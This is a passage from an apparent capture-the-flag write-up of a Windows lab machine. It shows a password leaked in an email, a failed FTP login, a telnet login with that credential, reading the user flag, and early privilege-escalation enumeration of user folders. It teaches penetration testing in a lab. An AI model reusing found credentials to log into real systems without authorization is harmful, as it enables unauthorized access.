</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>The password <span style=color:#000;font-weight:700>for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is pass
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>ed on to your engineers.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>Regards,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>John
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#000;font-weight:700>[</span>-- <span style=color:#998;font-style:italic>#1.1.2 51/2211 text/html, 7bit, us-ascii --]</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>?
</span></span></code></pre></div><p>Another set of credentials! I wonder what these are used for? Let&rsquo;s try FTP first</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#998;font-style:italic># ftp 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#099>220</span> Microsoft FTP Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>Name <span style=color:#000;font-weight:700>(</span>10.10.10.98:jamie<span style=color:#000;font-weight:700>)</span>: security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#099>331</span> Password required <span style=color:#000;font-weight:700>for</span> security.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>Password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#099>530</span> User cannot log in.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>ftp: Login failed.
</span></span></code></pre></div><p>No dice ☹. The only other option is <code>telnet</code>.</p><h2 id=telnet>Telnet</h2><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#998;font-style:italic># telnet 10.10.10.98</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>Trying 10.10.10.98...
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>Connected to 10.10.10.98.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>Escape character is <span style=color:#d14>&#39;^]&#39;</span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>Welcome to Microsoft Telnet Service
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>login: security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>password:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>*<span style=color:#000;font-weight:700>===============================================================</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>Microsoft Telnet Server.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>*<span style=color:#000;font-weight:700>===============================================================</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>C:<span style=color:#d14>\U</span>sers<span style=color:#d14>\s</span>ecurity&gt;
</span></span></code></pre></div><p>We&rsquo;re in! The <code>user.txt</code> should be located on <code>security</code>&rsquo;s Desktop</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\security&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Directory of C:\Users\security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>03</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>56</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>03</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>56</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          .yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Contacts
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Favorites
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Links
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Saved Games
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>35</span> PM    &lt;DIR&gt;          Searches
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>39</span> PM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>               <span style=color:#099>1</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>179</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>              <span style=color:#099>14</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>745</span>,<span style=color:#099>127</span>,<span style=color:#099>936</span> bytes free
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>C:\Users\security&gt;<span style=color:#0086b3>cd </span>Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>C:\Users\security\Desktop&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span> Directory of C:\Users\security\Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#099>08</span>/<span style=color:#099>21</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM                <span style=color:#099>32</span> user.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>               <span style=color:#099>1</span> File(s)             <span style=color:#099>32</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>               <span style=color:#099>2</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>744</span>,<span style=color:#099>726</span>,<span style=color:#099>528</span> bytes free
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>C:\Users\security\Desktop&gt;more user.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>&lt;SNIP&gt;
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>Now that we&rsquo;ve got the first flag, we need to escalate to <code>root</code> access—or more specifically <code>Administrator</code> on Windows.</p><p>The <code>.yawcam</code> directory looks out of the ordinary.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#0086b3>dir </span>.yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Directory of C:\Users\security\.yawcam
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          <span style=color:#099>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM                 <span style=color:#099>0</span> banlist.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          extravars
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM    &lt;DIR&gt;          img
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          logs
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM    &lt;DIR&gt;          motion
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>49</span> AM                 <span style=color:#099>0</span> pass.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          stream
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          tmp
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>34</span> PM                <span style=color:#099>82</span> ver.dat
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>10</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>52</span> PM    &lt;DIR&gt;          www
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#099>08</span>/<span style=color:#099>24</span>/<span style=color:#099>2018</span>  <span style=color:#099>07</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>37</span> PM             <span style=color:#099>1</span>,<span style=color:#099>411</span> yawcam_settings.xml
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>               <span style=color:#099>4</span> File(s)          <span style=color:#099>1</span>,<span style=color:#099>493</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>              <span style=color:#099>10</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>764</span>,<span style=color:#099>841</span>,<span style=color:#099>984</span> bytes free
</span></span></code></pre></div><p>However poking around in there proved fruitless. Maybe there&rsquo;s a way to use this, but I couldn&rsquo;t figure anything out.</p><p>Let&rsquo;s keep looking</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\security&gt;<span style=color:#0086b3>cd </span>../
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>08</span>/<span style=color:#099>23</span>/<span style=color:#099>2018</span>  <span style=color:#099>11</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>46</span> PM    &lt;DIR&gt;          Administrator
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>15</span> PM    &lt;DIR&gt;          engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>16</span> PM    &lt;DIR&gt;          security
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>               <span style=color:#099>0</span> File(s)              <span style=color:#099>0</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>               <span style=color:#099>6</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>754</span>,<span style=color:#099>778</span>,<span style=color:#099>112</span> bytes free
